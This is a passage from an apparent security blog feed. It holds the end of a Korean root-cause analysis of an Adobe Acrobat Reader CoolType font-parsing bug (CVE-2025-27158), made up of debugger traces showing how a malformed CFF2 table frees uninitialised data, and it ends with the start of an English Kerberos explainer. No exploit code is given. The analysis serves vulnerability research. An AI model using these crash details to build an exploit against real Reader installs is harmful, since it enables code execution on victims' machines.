class="hljs-number">1</span> hitTime Travel Position: E92BA:<span class="hljs-number">1B</span>EDeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e78 esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5948</span>:<span class="hljs-number">6</span>ee28e78 e8e63de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63) &lt;-[<span class="hljs-number">12</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C07eax=<span class="hljs-number">00008000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e7d esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei ng nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000286</span>CoolType!CTGetVersion+<span class="hljs-number">0xb594d</span>:<span class="hljs-number">6</span>ee28e7d b900800000      mov     ecx,<span class="hljs-number">8000</span>h<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C08eax=<span class="hljs-number">00008000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e82 esp=<span class="hljs-number">052f</span>c4a0 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei ng nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000286</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5952</span>:<span class="hljs-number">6</span>ee28e82 <span class="hljs-number">66894604</span>        mov     word ptr [esi+<span class="hljs-number">4</span>],ax      ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b334=e0e0 &lt;-[<span class="hljs-number">13</span>][...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C0Deax=<span class="hljs-number">00008000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e95 esp=<span class="hljs-number">052f</span>c4b8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5965</span>:<span class="hljs-number">6</span>ee28e95 <span class="hljs-number">03</span>c0            add     eax,eax &lt;-[<span class="hljs-number">14</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C0Eeax=<span class="hljs-number">00010000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e97 esp=<span class="hljs-number">052f</span>c4b8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5967</span>:<span class="hljs-number">6</span>ee28e97 <span class="hljs-number">50</span>              push    eax <span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92BA:<span class="hljs-number">1</span>C0Feax=<span class="hljs-number">00010000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00008000</span> edx=<span class="hljs-number">052f</span>c380 esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e98 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl nz na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000206</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5968</span>:<span class="hljs-number">6</span>ee28e98 e839cde4ff      call    CoolType!CTInit+<span class="hljs-number">0x2556</span> (<span class="hljs-number">6</span>ec75bd6) &lt;-[<span class="hljs-number">15</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">108</span>eax=f2bca0c8 ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28e9d esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei ng nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000282</span>CoolType!CTGetVersion+<span class="hljs-number">0xb596d</span>:<span class="hljs-number">6</span>ee28e9d <span class="hljs-number">8365</span>ec00        <span class="hljs-keyword">and</span>     dword ptr [ebp<span class="hljs-number">-14</span>h],<span class="hljs-number">0</span> ss:<span class="hljs-number">002b</span>:<span class="hljs-number">052f</span>c4c8=f3a2e384<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; db f2bca0c8f2bca0c8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca0d8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca0e8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca0f8  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca108  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca118  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca128  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................f2bca138  e0 e0 e0 e0 e0 e0 e0 e0-e0 e0 e0 e0 e0 e0 e0 e0  ................<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">109</span>eax=f2bca0c8 ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">6</span>ec75bfe edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28ea1 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5971</span>:<span class="hljs-number">6</span>ee28ea1 <span class="hljs-number">894608</span>          mov     dword ptr [esi+<span class="hljs-number">8</span>],eax ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b338=e0e0e0e0 &lt;-[<span class="hljs-number">16</span>][...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">10F</span>eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00010000</span> edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28eb0 esp=<span class="hljs-number">052f</span>c4b8 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         ov up ei ng nz na pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000</span>a87CoolType!CTGetVersion+<span class="hljs-number">0xb5980</span>:<span class="hljs-number">6</span>ee28eb0 <span class="hljs-number">57</span>              push    edi          &lt;-[<span class="hljs-number">17</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">110</span>eax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00010000</span> edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28eb1 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         ov up ei ng nz na pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000</span>a87CoolType!CTGetVersion+<span class="hljs-number">0xb5981</span>:<span class="hljs-number">6</span>ee28eb1 e8ad3de6ff      call    CoolType!CTInit+<span class="hljs-number">0x195e3</span> (<span class="hljs-number">6</span>ec8cc63)<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E92C1:<span class="hljs-number">12</span>Aeax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=<span class="hljs-number">00000000</span> edx=<span class="hljs-number">00000000</span> esi=<span class="hljs-number">0</span>a02b330 edi=f3a2a970eip=<span class="hljs-number">6</span>ee28eb6 esp=<span class="hljs-number">052f</span>c4b4 ebp=<span class="hljs-number">052f</span>c4dc iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb5986</span>:<span class="hljs-number">6</span>ee28eb6 <span class="hljs-number">59</span>              pop     ecx<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; uCoolType!CTGetVersion+<span class="hljs-number">0xb5986</span>:<span class="hljs-number">6</span>ee28eb6 <span class="hljs-number">59</span>              pop     ecx<span class="hljs-number">6</span>ee28eb7 <span class="hljs-number">0f</span>b7d0          movzx   edx,ax<span class="hljs-number">6</span>ee28eba <span class="hljs-number">8b</span>4608          mov     eax,dword ptr [esi+<span class="hljs-number">8</span>]<span class="hljs-number">6</span>ee28ebd <span class="hljs-number">0f</span>b7cb          movzx   ecx,bx<span class="hljs-number">6</span>ee28ec0 <span class="hljs-number">43</span>              inc     ebx<span class="hljs-number">6</span>ee28ec1 <span class="hljs-number">66891448</span>        mov     word ptr [eax+ecx*<span class="hljs-number">2</span>],dx<span class="hljs-number">6</span>ee28ec5 <span class="hljs-number">663b</span>5e04        cmp     bx,word ptr [esi+<span class="hljs-number">4</span>]<span class="hljs-number">6</span>ee28ec9 <span class="hljs-number">72e5</span>            jb      CoolType!CTGetVersion+<span class="hljs-number">0xb5980</span> (<span class="hljs-number">6</span>ee28eb0) &lt;-[<span class="hljs-number">18</span>]</code></pre><p>[8], [10], [12]&#xC5D0;&#xC11C; &#xAC01;&#xAC01; <strong>itemCount, shortDeltaCount, regionIndexCount</strong> &#xAC12;&#xC744; &#xC77D;&#xC5B4;&#xC640; [9], [11], [13]&#xC744; &#xD1B5;&#xD574; 0a02b330, 0a02b330+2, 0a02b330+4 &#xC8FC;&#xC18C;&#xC5D0; write &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xC138; &#xAC00;&#xC9C0; &#xAC12;&#xC740; &#xCCAB; &#xBC88;&#xC9F8; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70;, &#xD2B9;&#xD788; regionIndexCount&#xC740; regionIndexes &#xBC30;&#xC5F4;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[14]&#xC5D0;&#xC11C; regionIndexCount &#xAC12;(0x8000)&#xC744; &#xD1B5;&#xD574; &#xBC84;&#xD37C; &#xD06C;&#xAE30;(0x10000)&#xB97C; &#xACC4;&#xC0B0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; [15]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x2556</code>&#xC744; &#xD638;&#xCD9C;&#xD574; regionIndexes &#xBC84;&#xD37C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. </p><p>[16]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; regionIndexes &#xBC84;&#xD37C;&#xC758; &#xD3EC;&#xC778;&#xD130;(0xf2bca0c8)&#xB97C; [4]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xD55C; &#xBC84;&#xD37C;(0a02b330+8)&#xC5D0; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[17]&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD574; [18]&#xC5D0;&#xC11C; &#xB05D;&#xB098;&#xB294; &#xB8E8;&#xD504;&#xB294; &#xCCAB; &#xBC88;&#xC9F8; itemVariationData &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14; regionIndex&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xAC12;&#xC744; regionIndexes &#xBC84;&#xD37C;&#xC5D0; write &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;, &#xD30C;&#xC77C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBD80;&#xC871;&#xD574; regionIndexes &#xB370;&#xC774;&#xD130;&#xB97C; &#xBAA8;&#xB450; &#xC77D;&#xC9C0; &#xBABB;&#xD558;&#xBA74; &#xD560;&#xB2F9;&#xB41C; &#xBAA8;&#xB4E0; &#xBC84;&#xD37C;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp"><span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; gTime Travel Position: E9353:<span class="hljs-number">6</span>Deax=<span class="hljs-number">00000000</span> ebx=<span class="hljs-number">00000000</span> ecx=f3a36e40 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279d9 esp=<span class="hljs-number">052f</span>c1d8 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44a9</span>:<span class="hljs-number">6</span>ee279d9 <span class="hljs-number">8b</span>863c020000    mov     eax,dword ptr [esi+<span class="hljs-number">23</span>Ch] ds:<span class="hljs-number">002b</span>:f3a2abac=<span class="hljs-number">0</span>a02b330<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; tTime Travel Position: E9353:<span class="hljs-number">6</span>Eeax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000000</span> ecx=f3a36e40 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279df esp=<span class="hljs-number">052f</span>c1d8 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44af</span>:<span class="hljs-number">6</span>ee279df ff740708        push    dword ptr [edi+eax+<span class="hljs-number">8</span>] ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b338=f2bca0c8 &lt;-[<span class="hljs-number">19</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; dd <span class="hljs-number">0</span>a02b330<span class="hljs-number">0</span>a02b330  <span class="hljs-number">00000000</span> e0e08000 f2bca0c8 e0e0e0e0<span class="hljs-number">0</span>a02b340  e0e0e0e0 e0e0e0e0 e0e0e0e0 e0e0e0e0<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E9353:<span class="hljs-number">6F</span>eax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000000</span> ecx=f3a36e40 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279e3 esp=<span class="hljs-number">052f</span>c1d4 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl zr na pe nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000246</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44b3</span>:<span class="hljs-number">6</span>ee279e3 e82a4ce5ff      call    CoolType!CTInit+<span class="hljs-number">0x8f92</span> (<span class="hljs-number">6</span>ec7c612) &lt;-[<span class="hljs-number">20</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; pTime Travel Position: E935D:<span class="hljs-number">2382</span>eax=<span class="hljs-number">00000001</span> ebx=<span class="hljs-number">00000000</span> ecx=f2bca0c8 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000000</span>eip=<span class="hljs-number">6</span>ee279e8 esp=<span class="hljs-number">052f</span>c1d4 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei pl nz na po nccs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000202</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44b8</span>:<span class="hljs-number">6</span>ee279e8 <span class="hljs-number">0f</span>b78638020000  movzx   eax,word ptr [esi+<span class="hljs-number">238</span>h]  ds:<span class="hljs-number">002b</span>:f3a2aba8=<span class="hljs-number">0002</span><span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; dd f2bca0c8  &lt;-[<span class="hljs-number">21</span>]f2bca0c8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca0d8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca0e8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca0f8  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca108  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca118  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca128  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0f2bca138  f0f0f0f0 f0f0f0f0 f0f0f0f0 f0f0f0f0[...]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; tTime Travel Position: E935D:<span class="hljs-number">2389</span>eax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000001</span> ecx=f2bca0c8 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000010</span>eip=<span class="hljs-number">6</span>ee279df esp=<span class="hljs-number">052f</span>c1d8 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei ng nz ac pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000297</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44af</span>:<span class="hljs-number">6</span>ee279df ff740708        push    dword ptr [edi+eax+<span class="hljs-number">8</span>] ds:<span class="hljs-number">002b</span>:<span class="hljs-number">0</span>a02b348=e0e0e0e0  &lt;-[<span class="hljs-number">22</span>]<span class="hljs-number">0</span>:<span class="hljs-number">002</span>&gt; t Time Travel Position: E935D:<span class="hljs-number">238</span>Aeax=<span class="hljs-number">0</span>a02b330 ebx=<span class="hljs-number">00000001</span> ecx=f2bca0c8 edx=<span class="hljs-number">09</span>cf0000 esi=f3a2a970 edi=<span class="hljs-number">00000010</span>eip=<span class="hljs-number">6</span>ee279e3 esp=<span class="hljs-number">052f</span>c1d4 ebp=<span class="hljs-number">052f</span>c1e4 iopl=<span class="hljs-number">0</span>         nv up ei ng nz ac pe cycs=<span class="hljs-number">0023</span>  ss=<span class="hljs-number">002b</span>  ds=<span class="hljs-number">002b</span>  es=<span class="hljs-number">002b</span>  fs=<span class="hljs-number">0053</span>  gs=<span class="hljs-number">002b</span>             efl=<span class="hljs-number">00000297</span>CoolType!CTGetVersion+<span class="hljs-number">0xb44b3</span>:<span class="hljs-number">6</span>ee279e3 e82a4ce5ff      call    CoolType!CTInit+<span class="hljs-number">0x8f92</span> (<span class="hljs-number">6</span>ec7c612) &lt;-[<span class="hljs-number">23</span>]</code></pre><p>[19]&#xC5D0;&#xC11C; &#xCCAB; &#xBC88;&#xC9F8; regionIndexes &#xBC84;&#xD37C;&#xC758; &#xC8FC;&#xC18C;(0xf2bca0c8)&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; push &#xD569;&#xB2C8;&#xB2E4;.</p><p>[20]&#xC5D0;&#xC11C; <code>CoolType!CTInit+0x8f92</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xCCAB; &#xBC88;&#xC9F8; &#xBC84;&#xD37C;&#xB97C; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[22]&#xC5D0;&#xC11C; &#xB450; &#xBC88;&#xC9F8; &#xD558;&#xC704; &#xD14C;&#xC774;&#xBE14;&#xC758; regionIndexes &#xBC84;&#xD37C; &#xC8FC;&#xC18C;&#xB97C; push &#xD558;&#xB824; &#xD558;&#xC9C0;&#xB9CC;, &#xD560;&#xB2F9;&#xC774; &#xC548;&#xB418;&#xC5C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB354;&#xBBF8; &#xB370;&#xC774;&#xD130;(0xe0e0e0e0)&#xB97C; push &#xD574; [23] &#xC2E4;&#xD589; &#xC2DC; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; [4]&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xB41C; &#xBC84;&#xD37C;(0x0a02b330)&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/Adobe-Acrobat-Reader/">Adobe Acrobat Reader</category>
      
      <category domain="https://hackyboiz.github.io/tags/Memory-Corruption/">Memory Corruption</category>
      
      <category domain="https://hackyboiz.github.io/tags/OTF/">OTF</category>
      
      <category domain="https://hackyboiz.github.io/tags/CFF2/">CFF2</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/23/ogu123/cve-2025-27158/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows Authentication Series (Part2. Kerberos)(EN)</title>
      <link>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/en/</link>
      <guid>https://hackyboiz.github.io/2025/04/21/mungsul/NTLM_Part2/en/</guid>
      <pubDate>Mon, 21 Apr 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;hello. Welcome back to the Win</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>hello. Welcome back to the Windows Authentication Series. In Part 1 NTLM, I said that we would look at NTLM-related CVEs in Part 2. While it&#x2019;s good to cover NTLM-related CVEs, I thought it would be a good idea to cover the Kerberos authentication protocol, which is mainly used in Windows, first.</p><p>In this article, I&#x2019;ll show you how Kerberos works, how it&#x2019;s implemented in the Windows environment, and analyze some Kerberos-related attacks and CVE vulnerabilities.</p><h1 id="Kerberos-Authentication"><a href="#Kerberos-Authentication" class="headerlink" title="Kerberos Authentication"></a>Kerberos Authentication</h1><p>Kerberos is a ticket-based authentication protocol that allows users and services to authenticate each other without exposing the passwords themselves to the network by issuing tickets based on symmetric key cryptography through a KDC.</p><p>This authentication structure features the following elements</p><ul><li>Key Distribution Center (KDC): The key distribution center, a composite of the AS and TGS, provides authentication services and generates and distributes session keys.</li><li>AS (Authentication Server): Authentication server, performs client authentication and issues TGTs to clients encrypted with the TGS&#x2019;s secret key.</li><li>Ticket Granting Server (TGS): A ticket granting server that issues STs and session keys when a client sends a TGT to the TGS.</li><li>TGT (Ticket Granting Ticket): A ticket granting ticket, which allows a ticket to be issued by the TGS.</li><li>ST (Service Ticket): A ticket that allows you to use a service.</li><li>SS (Service Server): The server that provides the service.</li></ul><p>The Kerberos authentication process can be summarized as follows:</p><ol><li>The client makes an authentication request to the AS.</li><li>the AS issues a TGT to the client.<ol><li>The TGT is encrypted with the secret key of the TGS.</li><li>the AS and TGS typically share the same host as the KDC.</li></ol></li><li>The client communicates the TGT and the ID of the service to be requested to the TGS.</li><li>the TGS issues an ST to the client.<br>The service the client is requesting access to must be registered with the TGS with a Service Principal Name (SPN).</li><li>The client forwards the ST to the server.</li><li>Perform the communication.</li></ol><p>The above process is schematized in the following figure.</p><p><img src="/2025/04/21/mungsul/NTLM_Part2/en/1.png" alt></p><h2 id="Kerberos-authentication-on-Windows"><a href="#Kerberos-authentication-on-Windows" class="headerlink" title="Kerberos authentication on Windows"></a>Kerberos authentication on Windows</h2><p>In the Windows Kerberos implementation, tickets include something called a Privilege Attribute Certificate (PAC). The PAC contains the user&#x2019;s group information and authorization data, among other things. The KDC signs this information to issue the ticket. When a ticket comes in, the service server looks at the PAC, checks the permissions, and either grants or denies access.</p><p>Now, in Windows, the Kerberos authentication process outlined above looks 